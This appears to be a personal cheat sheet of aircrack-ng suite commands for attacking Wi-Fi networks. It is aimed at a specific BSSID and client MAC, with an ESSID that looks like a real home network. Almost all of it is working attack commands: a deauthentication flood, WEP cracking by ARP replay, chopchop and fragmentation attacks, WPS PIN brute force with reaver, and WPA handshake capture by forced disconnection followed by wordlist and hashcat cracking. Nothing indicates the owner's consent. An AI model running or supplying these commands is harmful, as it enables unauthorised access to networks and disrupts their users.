> target: 8C:59:C3:72:38:9C   -2       12        1    0   1  130  WPA2 CCMP   PSK  NETIASPOT-2.4GHz-723898
```bash
airdump-ng
See all types of wifis:	--band abg
The use the essid or bssid to capturee packets

Sniffing:
$ sudo airodump-ng wlan0 --bssid 8C:59:C3:72:38:9C --channel 1

Deauth Attack:
$ sudo aireplay-ng --deauth 100000000 -a 8C:59:C3:72:38:9C -c 04:B1:67:AD:58:1D wlan0

---WEP cracking:
always set:
$ sudo airodump-ng wlan0 --bssid 8C:59:C3:72:38:9C --channel 1 --write <nameoffile>

--simple case (busy networks)
$ sudo aircrack-ng <.cap file from airdump-ng>

--not busy network:
sudo ifconfig to get the host mac adress: 66-BA-C4-18-B2-07-30-3A-00-00-00-00-00-00-00-00
associate with the network:
$ sudo aireplay-ng --fakeauth 0 -a 8C:59:C3:72:38:9C -h 66:BA:C4:18:B2:07 wlan0

-launch attack:
ARPreplay attack:
$ sudo aireplay-ng --arpreplay -a 8C:59:C3:72:38:9C -h 66:BA:C4:18:B2:07 wlan0
wait
$ sudo aircrack-ng <.cap file from airdump-ng>

or ChopChopAttack (slow but we can be far away):
$ sudo aireplay-ng --chopchop -b 8C:59:C3:72:38:9C -h 66:BA:C4:18:B2:07 wlan0
wait
$ sudo packetforge-ng -a 8C:59:C3:72:38:9C -h 66:BA:C4:18:B2:07 -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <packet>
inject packet:
$ sudo aireplay-ng -2 -r <packet> wlan0
wait
$ sudo aircrack-ng <.cap file from airdump-ng>

or Fragmentation Attack (quicker but we need to be close):
$ sudo aireplay-ng --fragment -b 8C:59:C3:72:38:9C -h 66:BA:C4:18:B2:07 wlan0
wait
$ sudo packetforge-ng -a 8C:59:C3:72:38:9C -h 66:BA:C4:18:B2:07 -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <packet>
inject packet:
$ sudo aireplay-ng -2 -r <packet> wlan0
wait
$ sudo aircrack-ng <.cap file from airdump-ng>


---WPA/WPA2 cracking

--WPS attack
-Check nets with WPS on
sudo wash --interface wlan0
-Associate with the network:
$ sudo aireplay-ng --fakeauth 30 -a 8C:59:C3:72:38:9C -h 66:BA:C4:18:B2:07 wlan0
-reaver to bruteforce
$ sudo reaver --bssid 8C:59:C3:72:38:9C --channel 1 --interface wlan0 -vvv --no-associate

--WPA cracking
-capture handsake
$ sudo airodump-ng --bssid 8C:59:C3:72:38:9C --channel 1 --write data/wpa_handsake wlan0
-desconnect a target to force the handsake
$ sudo aireplay-ng --deauth 4 -a 8C:59:C3:72:38:9C -c 04:B1:67:AD:58:1D wlan0

-brute force to the handsake (maybe use a web service)
$ sudo crunch 6 8 abc12 -o wordlist/test.txt -t a@@@@@b
$ sudo aircrack-ng wpa_handsake-01.cap -w wordlist.txt

-brute force with hashcat
$ sudo hashcat -m 2500 -d 1 <.cap converted through page>.hccapx /usr/share/wordlists/rockyou.txt
```
